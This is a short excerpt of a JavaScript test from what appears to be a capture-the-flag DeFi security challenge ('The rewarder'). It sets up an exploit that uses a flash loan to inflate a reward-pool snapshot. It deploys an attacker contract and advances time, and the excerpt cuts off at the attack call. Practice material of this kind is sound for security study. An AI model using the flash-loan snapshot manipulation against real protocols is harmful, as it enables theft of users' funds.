...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    ...
    // use flash loan to deposit into reward pool
    // this takes a snapshot of the tokens you have and gives you rewards for it
    const ExploitFactory = await ethers.getContractFactory("RewardExploit", attacker);
    this.exploitContract = await ExploitFactory.deploy();

    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);

    await this.exploitContract
      .connect(attacker)
      .attack(
